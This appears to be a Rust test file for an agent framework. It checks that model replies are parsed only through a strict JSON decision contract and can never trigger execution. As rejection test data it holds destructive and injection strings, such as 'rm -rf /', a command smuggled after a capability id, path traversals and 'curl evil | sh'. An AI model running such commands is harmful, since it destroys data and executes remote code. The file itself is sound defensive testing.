//! PR28: a model's reply becomes a `WorkDecision` only through the strict `chip.work-decision.v1`
//! contract, and nothing the model writes can become execution.

use std::fs;
use std::path::Path;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};

use chip_core::{
    Agent, Capability, CapabilityAvailability, CapabilityDescriptor, CapabilityError, CapabilityId,
    CapabilityInput, CapabilityProvider, DecisionError, EscalationContext, EvidenceLookup,
    EvidenceState, ExecutionError, ExecutionEvent, ExecutionId, ExecutionObserver,
    ExecutionRequest, ExecutionResult, Executor, InputValue, LocalReasoningResult,
    ModelDecisionBoundary, NoLocalPolicy, ScriptedPolicy, TestLocalReasoner, WorkDecision,
    WorkDecisionBoundary, WorkEvent, WorkGoal, WorkId, WorkLimits, WorkOutcome, WorkReport,
    WorkSpec, verify_trajectory,
};
use fx_core::{FxError, ModelProvider, ModelRequest, ModelResponse, Usage};

fn cap(id: &str, inputs: &[&str], availability: CapabilityAvailability) -> Capability {
    let mut descriptor = CapabilityDescriptor::new(CapabilityId::new(id).unwrap(), id, "described");
    for name in inputs {
        descriptor.inputs.push(CapabilityInput {
            name: (*name).into(),
            description: String::new(),
            required: false,
        });
    }
    Capability {
        descriptor,
        availability,
    }
}

fn declared() -> Vec<Capability> {
    vec![
        cap(
            "compute.selftest",
            &["n"],
            CapabilityAvailability::Available,
        ),
        cap("deploy.service", &[], CapabilityAvailability::Available),
        cap(
            "offline.thing",
            &[],
            CapabilityAvailability::Unavailable("down".into()),
        ),
    ]
}

fn reply(output: &str) -> ModelResponse {
    ModelResponse::new("chatcmpl-abc123", output, Usage::new(5, 5))
}

fn read(output: &str) -> Result<WorkDecision, DecisionError> {
    ModelDecisionBoundary.interpret(&reply(output), &declared())
}

#[test]
fn the_four_decisions_are_read_as_data() {
    assert_eq!(
        read(r#"{"decision":"complete","summary":"all done"}"#).unwrap(),
        WorkDecision::Complete {
            summary: "all done".into()
        }
    );
    assert_eq!(
        read(r#"{"decision":"escalate","reason":"needs a person"}"#).unwrap(),
        WorkDecision::Escalate {
            reason: "needs a person".into()
        }
    );
    assert_eq!(
        read(r#"{"decision":"block","reason":"no approval"}"#).unwrap(),
        WorkDecision::Block {
            reason: "no approval".into()
        }
    );
    let WorkDecision::RequestCapability(request) =
        read(r#"{"decision":"request_capability","capability":"compute.selftest"}"#).unwrap()
    else {
        panic!()
    };
    assert_eq!(request.capability_id.as_str(), "compute.selftest");
    assert!(request.inputs.is_empty());

    let WorkDecision::RequestCapability(with_inputs) =
        read(r#"{"decision":"request_capability","capability":"compute.selftest","inputs":{"n":3,"label":"x","dry":true}}"#).unwrap()
    else {
        panic!()
    };
    assert_eq!(with_inputs.inputs.get("n"), Some(&InputValue::Integer(3)));
    assert_eq!(
        with_inputs.inputs.get("label"),
        Some(&InputValue::Text("x".into()))
    );
    assert_eq!(with_inputs.inputs.get("dry"), Some(&InputValue::Bool(true)));
}

#[test]
fn whitespace_key_order_escapes_and_one_code_fence_are_tolerated() {
    let want = WorkDecision::Complete {
        summary: "tab\there \"quoted\" é".into(),
    };
    for text in [
        "  \n{ \"summary\" : \"tab\\there \\\"quoted\\\" \\u00e9\" , \"decision\" : \"complete\" }\n ",
        "```json\n{\"decision\":\"complete\",\"summary\":\"tab\\there \\\"quoted\\\" é\"}\n```",
        "```\n{\"decision\":\"complete\",\"summary\":\"tab\\there \\\"quoted\\\" é\"}\n```",
    ] {
        assert_eq!(read(text).unwrap(), want, "{text}");
    }
}

#[test]
fn every_malformed_reply_is_an_error_with_a_reason() {
    let huge = format!(
        "{{\"decision\":\"complete\",\"summary\":\"{}\"}}",
        "x".repeat(5000)
    );
    let long_text = format!(
        "{{\"decision\":\"complete\",\"summary\":\"{}\"}}",
        "x".repeat(2000)
    );
    let cases: Vec<(&str, String, &str)> = vec![
        ("empty", "".into(), "not valid JSON"),
        ("prose", "I think we should run the self test.".into(), "not valid JSON"),
        ("prose around the object", r#"Sure! {"decision":"complete","summary":"x"}"#.into(), "not valid JSON"),
        ("text after the object", r#"{"decision":"complete","summary":"x"} thanks"#.into(), "after the JSON object"),
        ("invalid json", r#"{"decision":"complete","summary":"x""#.into(), "not valid JSON"),
        ("trailing comma", r#"{"decision":"complete","summary":"x",}"#.into(), "not valid JSON"),
        ("single quotes", "{'decision':'complete'}".into(), "not valid JSON"),
        ("an array", r#"[{"decision":"complete"}]"#.into(), "arrays"),
        ("a bare string", r#""complete""#.into(), "must be a JSON object"),
        ("null", "null".into(), "null"),
        ("unclosed fence", "```json\n{\"decision\":\"complete\",\"summary\":\"x\"}".into(), "unclosed"),
        ("unknown decision", r#"{"decision":"run_shell","summary":"x"}"#.into(), "unknown decision"),
        ("decision of the wrong type", r#"{"decision":7}"#.into(), "must be a string"),
        ("missing decision", r#"{"summary":"x"}"#.into(), "missing required field \"decision\""),
        ("complete without summary", r#"{"decision":"complete"}"#.into(), "missing required field \"summary\""),
        ("block without reason", r#"{"decision":"block"}"#.into(), "missing required field \"reason\""),
        ("escalate without reason", r#"{"decision":"escalate"}"#.into(), "missing required field \"reason\""),
        ("request without capability", r#"{"decision":"request_capability"}"#.into(), "missing required field \"capability\""),
        ("an extra field", r#"{"decision":"complete","summary":"x","command":"rm -rf /"}"#.into(), "unexpected field \"command\""),
        ("an extra field on a request", r#"{"decision":"request_capability","capability":"compute.selftest","shell":"ls"}"#.into(), "unexpected field \"shell\""),
        ("duplicate keys", r#"{"decision":"block","decision":"complete","summary":"x"}"#.into(), "duplicate field"),
        ("summary of the wrong type", r#"{"decision":"complete","summary":3}"#.into(), "must be a string"),
        ("a float input", r#"{"decision":"request_capability","capability":"compute.selftest","inputs":{"n":1.5}}"#.into(), "whole numbers"),
        ("a nested input", r#"{"decision":"request_capability","capability":"compute.selftest","inputs":{"n":{"a":1}}}"#.into(), "nested"),
        ("a null input", r#"{"decision":"request_capability","capability":"compute.selftest","inputs":{"n":null}}"#.into(), "null"),
        ("inputs that are not an object", r#"{"decision":"request_capability","capability":"compute.selftest","inputs":[1]}"#.into(), "arrays"),
        ("an oversized reply", huge, "limit"),
        ("an oversized field", long_text, "too long"),
        ("a bad escape", r#"{"decision":"block","reason":"\q"}"#.into(), "unknown escape"),
    ];
    for (name, text, expected) in cases {
        match read(&text) {
            Err(e) => assert!(
                e.to_string().contains(expected),
                "{name}: {e} does not mention {expected:?}"
            ),
            Ok(d) => panic!("{name}: accepted as {d:?}"),
        }
    }
}

#[test]
fn an_invalid_or_undeclared_capability_is_an_error_not_a_request() {
    for (name, capability) in [
        ("a shell command", "rm -rf /"),
        ("a command after a valid id", "compute.selftest; rm -rf /"),
        ("uppercase", "Compute.Selftest"),
        ("empty", ""),
        ("a path", "../../bin/sh"),
        ("an undeclared id", "deploy.production"),
        ("an unavailable one", "offline.thing"),
    ] {
        let text =
            format!("{{\"decision\":\"request_capability\",\"capability\":\"{capability}\"}}");
        let e = read(&text).expect_err(name);
        assert!(matches!(e, DecisionError::Capability(_)), "{name}: {e:?}");
    }
}

#[test]
fn the_model_never_names_an_execution() {
    for provider_id in [
        "chatcmpl-abc123",
        "../../etc/passwd",
        "a b; rm -rf /",
        "",
        "\u{1F4A5}",
    ] {
        let response = ModelResponse::new(
            provider_id,
            r#"{"decision":"request_capability","capability":"compute.selftest"}"#,
            Usage::new(1, 1),
        );
        let WorkDecision::RequestCapability(r) = ModelDecisionBoundary
            .interpret(&response, &declared())
            .unwrap()
        else {
            panic!()
        };
        let id = r.execution_id.0;
        assert!(
            id.starts_with("model-") && id.chars().all(|c| c.is_ascii_alphanumeric() || c == '-'),
            "{provider_id:?} -> {id:?}"
        );
    }
    // A reply cannot smuggle an id: it is an extra field.
    assert!(read(r#"{"decision":"request_capability","capability":"compute.selftest","execution_id":"x"}"#).is_err());
}

#[test]
fn the_question_states_the_contract_and_lists_only_what_can_be_used() {
    let q = ModelDecisionBoundary.question(&declared());
    assert!(q.contains("chip.work-decision.v1") && q.contains("exactly one JSON object"));
    assert!(q.contains("compute.selftest (inputs: n)") && q.contains("deploy.service"));
    assert!(
        !q.contains("offline.thing"),
        "an unavailable capability is not offered"
    );
    assert!(
        ModelDecisionBoundary
            .question(&[])
            .contains("Available capabilities: none")
    );
}

// ------------------------------------------------------------------------------------------
// Through the loop, with a deterministic provider that replies with fixed text
// ------------------------------------------------------------------------------------------

struct Replies {
    output: String,
    calls: AtomicUsize,
    seen: Mutex<Vec<ModelRequest>>,
    fail: bool,
}

impl Replies {
    fn new(output: &str) -> Arc<Replies> {
        Arc::new(Replies {
            output: output.into(),
            calls: AtomicUsize::new(0),
            seen: Mutex::new(vec![]),
            fail: false,
        })
    }
    fn failing() -> Arc<Replies> {
        Arc::new(Replies {
            output: String::new(),
            calls: AtomicUsize::new(0),
            seen: Mutex::new(vec![]),
            fail: true,
        })
    }
    fn calls(&self) -> usize {
        self.calls.load(Ordering::SeqCst)
    }
}

#[async_trait::async_trait]
impl ModelProvider for Replies {
    async fn complete(&self, request: ModelRequest) -> Result<ModelResponse, FxError> {
        self.calls.fetch_add(1, Ordering::SeqCst);
        self.seen.lock().unwrap().push(request);
        if self.fail {
            return Err(FxError::Provider("provider error".into()));
        }
        Ok(ModelResponse::new(
            "resp-1",
            self.output.clone(),
            Usage::new(11, 4),
        ))
    }
}

struct Exec(AtomicUsize);

#[async_trait::async_trait]
impl Executor for Exec {
    async fn execute(&self, r: ExecutionRequest) -> Result<ExecutionResult, ExecutionError> {
        self.0.fetch_add(1, Ordering::SeqCst);
        Ok(ExecutionResult::success(r.id, "ran").with_receipt_id("sha256:real"))
    }
}

struct Caps;

#[async_trait::async_trait]
impl CapabilityProvider for Caps {
    async fn capabilities(&self) -> Result<Vec<CapabilityDescriptor>, CapabilityError> {
        let mut d = CapabilityDescriptor::new(CapabilityId::new("compute.selftest")?, "t", "t");
        d.inputs.push(CapabilityInput {
            name: "n".into(),
            description: String::new(),
            required: false,
        });
        Ok(vec![d])
    }
    async fn availability(&self, _: &CapabilityId) -> CapabilityAvailability {
        CapabilityAvailability::Available
    }
}

fn agent(model: &Arc<Replies>, exec: &Arc<Exec>) -> Agent {
    Agent::new(model.clone())
        .with_capabilities(Arc::new(Caps))
        .with_executor(exec.clone())
        .with_observer(Arc::new(ExecutionObserver))
        .with_local_reasoner(Arc::new(TestLocalReasoner::default()))
}

fn spec() -> WorkSpec {
    WorkSpec::new(
        WorkId::new("w"),
        WorkGoal::new("Determine the next action for compute.selftest"),
    )
}

async fn escalate_once(
    model: &Arc<Replies>,
    exec: &Arc<Exec>,
    then: Vec<Option<WorkDecision>>,
) -> (Agent, WorkReport) {
    let a = agent(model, exec);
    let mut script = vec![None];
    script.extend(then);
    let report = a
        .run_work(
            &spec(),
            &ScriptedPolicy::new(script),
            &ModelDecisionBoundary,
        )
        .await;
    (a, report)
}

#[tokio::test]
async fn a_valid_model_decision_drives_the_trajectory_through_to_a_terminal_state() {
    let (model, exec) = (
        Replies::new(r#"{"decision":"request_capability","capability":"compute.selftest"}"#),
        Arc::new(Exec(AtomicUsize::new(0))),
    );
    let (_, report) = escalate_once(
        &model,
        &exec,
        vec![Some(WorkDecision::Complete {
            summary: "ok".into(),
        })],
    )
    .await;
    assert!(
        matches!(report.outcome, WorkOutcome::Completed { .. }),
        "{:?}",
        report.outcome
    );
    assert_eq!((model.calls(), exec.0.load(Ordering::SeqCst)), (1, 1));
    let m = report.measurement();
    assert_eq!(
        (
            m.model_calls,
            m.model_escalations,
            m.executions,
            m.observations,
            m.local_decisions
        ),
        (1, 1, 1, 1, 1)
    );
    assert_eq!(
        m.model_tokens,
        Some(15),
        "the provider's usage, 11 + 4, flows into the measurement"
    );
    assert!(m.context_bytes > 0);
    assert!(report.observations[0].receipt_id.as_deref() == Some("sha256:real"));
    assert_eq!(
        verify_trajectory(&report.events, &spec().limits),
        Vec::<String>::new()
    );

    for (reply, expect) in [
        (r#"{"decision":"complete","summary":"done"}"#, "completed"),
        (r#"{"decision":"block","reason":"nope"}"#, "blocked"),
        (r#"{"decision":"escalate","reason":"help"}"#, "escalated"),
    ] {
        let (model, exec) = (Replies::new(reply), Arc::new(Exec(AtomicUsize::new(0))));
        let (_, r) = escalate_once(&model, &exec, vec![]).await;
        assert_eq!(r.outcome.terminal_state().name(), expect, "{reply}");
        assert_eq!(model.calls(), 1);
        assert_eq!(
            exec.0.load(Ordering::SeqCst),
            0,
            "{reply}: the model's decision alone executed nothing"
        );
    }
}

#[tokio::test]
async fn invalid_model_output_never_becomes_execution_observation_or_evidence() {
    for output in [
        "not json at all",
        r#"{"decision":"run_shell","command":"rm -rf /"}"#,
        r#"{"decision":"request_capability","capability":"rm -rf /"}"#,
        r#"{"decision":"request_capability","capability":"deploy.production"}"#,
        r#"{"decision":"request_capability"}"#,
        r#"{"decision":"complete"}"#,
        r#"{"decision":"request_capability","capability":"compute.selftest","extra":1}"#,
        "Run the self test now:\n```sh\ncompute selftest\n```",
        "",
    ] {
        let (model, exec) = (Replies::new(output), Arc::new(Exec(AtomicUsize::new(0))));
        let (a, report) = escalate_once(
            &model,
            &exec,
            vec![Some(WorkDecision::Complete {
                summary: "x".into(),
            })],
        )
        .await;
        let m = report.measurement();
        assert!(
            matches!(report.outcome, WorkOutcome::Failed { .. }),
            "{output:?}: {:?}",
            report.outcome
        );
        assert_eq!(
            model.calls(),
            1,
            "{output:?}: no repair, no retry, no second call"
        );
        assert_eq!(
            (
                m.executions,
                m.observations,
                m.evidence_hits,
                m.model_calls,
                m.model_escalations
            ),
            (0, 0, 0, 1, 1),
            "{output:?}"
        );
        assert_eq!(exec.0.load(Ordering::SeqCst), 0, "{output:?}");
        assert!(report.observations.is_empty());
        assert!(!report.events.iter().any(|e| matches!(
            e,
            WorkEvent::Execution(_) | WorkEvent::EvidenceRecorded { .. }
        )));
        assert_eq!(
            a.lookup_evidence(&chip_core::CapabilityRequest::new(
                ExecutionId::new("x"),
                CapabilityId::new("compute.selftest").unwrap()
            )),
            EvidenceLookup::NotFound
        );
        assert_eq!(
            m.model_tokens,
            Some(15),
            "the call happened and its usage is recorded"
        );
        assert_eq!(
            verify_trajectory(&report.events, &spec().limits),
            Vec::<String>::new()
        );
    }
}

#[tokio::test]
async fn a_provider_failure_is_still_a_recorded_model_call_and_executes_nothing() {
    let (model, exec) = (Replies::failing(), Arc::new(Exec(AtomicUsize::new(0))));
    let (_, report) = escalate_once(&model, &exec, vec![]).await;
    let m = report.measurement();
    assert!(matches!(report.outcome, WorkOutcome::Failed { .. }));
    assert_eq!(
        (model.calls(), m.model_calls, m.model_escalations),
        (1, 1, 1),
        "one attempt, no retry, and the event says it happened"
    );
    assert_eq!(
        (m.executions, m.observations, m.model_tokens),
        (0, 0, None),
        "no usage was reported, and none is invented"
    );
    let called = report.events.iter().find_map(|e| match e {
        WorkEvent::ModelCalled { usage, .. } => Some(*usage),
        _ => None,
    });
    assert_eq!(called, Some(None));
    assert_eq!(exec.0.load(Ordering::SeqCst), 0);
}

#[tokio::test]
async fn the_request_sent_through_fx_is_exactly_the_measured_escalation_context() {
    let (model, exec) = (
        Replies::new(r#"{"decision":"complete","summary":"x"}"#),
        Arc::new(Exec(AtomicUsize::new(0))),
    );
    let a = agent(&model, &exec);
    let report = a
        .run_work(&spec(), &NoLocalPolicy, &ModelDecisionBoundary)
        .await;

    let sent = model.seen.lock().unwrap()[0].clone();
    // One message, the rendered context, and nothing else: no trajectory, no state, no environment.
    assert_eq!(sent.messages.len(), 1);
    let caps = a.discover_capabilities().await.result.unwrap();
    let expected = EscalationContext {
        goal: "Determine the next action for compute.selftest".into(),
        current_state: format!(
            "turn 1 of {}; executions 0 of {}",
            WorkLimits::default().max_turns,
            WorkLimits::default().max_executions
        ),
        relevant_evidence: vec![],
        relevant_observations: vec![],
        prior_decisions: vec![],
        ruled_out: vec![],
        omitted: vec![],
        question: ModelDecisionBoundary.question(&caps),
    };
    assert_eq!(sent.messages[0].content, expected.render());

    let bytes: usize = sent.messages.iter().map(|m| m.content.len()).sum();
    let chars: usize = sent
        .messages
        .iter()
        .map(|m| m.content.chars().count())
        .sum();
    let m = report.measurement();
    assert_eq!(
        (m.context_bytes as usize, m.context_chars as usize),
        (bytes, chars)
    );
    assert_eq!(expected.metrics().bytes, bytes);
    assert!(
        sent.max_tokens.is_some() && sent.temperature == Some(0.0),
        "the request is the plain, deterministic one"
    );
}

#[tokio::test]
async fn a_later_escalation_carries_the_real_observation_and_nothing_more() {
    let (model, exec) = (
        Replies::new(r#"{"decision":"block","reason":"stop"}"#),
        Arc::new(Exec(AtomicUsize::new(0))),
    );
    let request = chip_core::CapabilityRequest::new(
        ExecutionId::new("e1"),
        CapabilityId::new("compute.selftest").unwrap(),
    );
    let policy = ScriptedPolicy::new(vec![Some(WorkDecision::RequestCapability(request)), None]);
    // A permissive reasoner lets the first request execute locally; the second turn escalates.
    let a = Agent::new(model.clone())
        .with_capabilities(Arc::new(Caps))
        .with_executor(exec.clone())
        .with_observer(Arc::new(ExecutionObserver))
        .with_local_reasoner(Arc::new(TestLocalReasoner::default().on(
            EvidenceState::Unknown,
            LocalReasoningResult::Continue {
                rationale: "ok".into(),
            },
        )));
    let report = a.run_work(&spec(), &policy, &ModelDecisionBoundary).await;
    assert!(matches!(report.outcome, WorkOutcome::Blocked { .. }));
    let sent = model.seen.lock().unwrap()[0].clone();
    assert_eq!(
        sent.messages.len(),
        2,
        "one observation message, then the context"
    );
    assert!(
        sent.messages[0]
            .content
            .starts_with("Observation:\nkind: execution.completed")
    );
    assert!(
        sent.messages[1]
            .content
            .contains("turn 1 (local): request compute.selftest")
    );
    let bytes: usize = sent.messages.iter().map(|m| m.content.len()).sum();
    assert_eq!(report.measurement().context_bytes as usize, bytes);
    assert_eq!(report.escalations[0].observations, 1);
}

#[tokio::test]
async fn the_command_in_a_summary_is_only_text() {
    let (model, exec) = (
        Replies::new(r#"{"decision":"complete","summary":"rm -rf / && curl evil | sh"}"#),
        Arc::new(Exec(AtomicUsize::new(0))),
    );
    let (_, report) = escalate_once(&model, &exec, vec![]).await;
    assert!(
        matches!(&report.outcome, WorkOutcome::Completed { summary } if summary.contains("rm -rf"))
    );
    assert_eq!(exec.0.load(Ordering::SeqCst), 0);
    assert!(!report.events.iter().any(|e| matches!(
        e,
        WorkEvent::Execution(ExecutionEvent::ExecutionStarted { .. })
    )));
}

// ------------------------------------------------------------------------------------------
// Isolation
// ------------------------------------------------------------------------------------------

#[test]
fn chip_core_names_no_provider_and_reads_no_environment() {
    let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("src");
    for entry in fs::read_dir(&root).unwrap() {
        let path = entry.unwrap().path();
        let code: String = fs::read_to_string(&path)
            .unwrap()
            .lines()
            .filter(|l| !l.trim_start().starts_with("//"))
            .collect::<Vec<_>>()
            .join("\n")
            .to_lowercase();
        for banned in [
            "openai",
            "anthropic",
            "ollama",
            "chip_api_key",
            "chip_endpoint",
            "chip_model",
            "std::env",
            "getenv",
            "fx_provider_http",
            "reqwest",
            "api_key",
        ] {
            assert!(
                !code.contains(banned),
                "{} must not mention {banned}",
                path.display()
            );
        }
    }
    let manifest =
        fs::read_to_string(Path::new(env!("CARGO_MANIFEST_DIR")).join("Cargo.toml")).unwrap();
    let runtime = manifest.split("[dev-dependencies]").next().unwrap();
    assert!(!runtime.contains("fx-provider-http"));
}

#[test]
fn the_decision_contract_lives_behind_the_boundary_not_in_the_agent() {
    let src = Path::new(env!("CARGO_MANIFEST_DIR")).join("src");
    let work = fs::read_to_string(src.join("work.rs")).unwrap();
    assert!(
        !work.contains("\"decision\"") && !work.contains("request_capability"),
        "work.rs must not parse any reply format"
    );
    let lib = fs::read_to_string(src.join("lib.rs")).unwrap();
    assert!(
        !lib.contains("chip.work-decision"),
        "the agent does not know the contract"
    );
}

#[tokio::test]
async fn a_provider_that_reports_no_usage_yields_none_not_an_estimate() {
    struct Silent;
    #[async_trait::async_trait]
    impl ModelProvider for Silent {
        async fn complete(&self, _: ModelRequest) -> Result<ModelResponse, FxError> {
            // What an OpenAI-compatible provider returns when the wire body has no usage object.
            Ok(ModelResponse::new(
                "r",
                r#"{"decision":"complete","summary":"x"}"#,
                Usage::new(0, 0),
            ))
        }
    }
    let exec = Arc::new(Exec(AtomicUsize::new(0)));
    let a = Agent::new(Arc::new(Silent))
        .with_capabilities(Arc::new(Caps))
        .with_executor(exec)
        .with_observer(Arc::new(ExecutionObserver))
        .with_local_reasoner(Arc::new(TestLocalReasoner::default()));
    let report = a
        .run_work(&spec(), &NoLocalPolicy, &ModelDecisionBoundary)
        .await;
    let m = report.measurement();
    assert!(matches!(report.outcome, WorkOutcome::Completed { .. }));
    assert_eq!((m.model_calls, m.model_tokens), (1, None));
    let called = report.events.iter().find_map(|e| match e {
        WorkEvent::ModelCalled {
            usage, succeeded, ..
        } => Some((*usage, *succeeded)),
        _ => None,
    });
    assert_eq!(
        called,
        Some((None, true)),
        "the call succeeded; only its usage is unknown"
    );
}
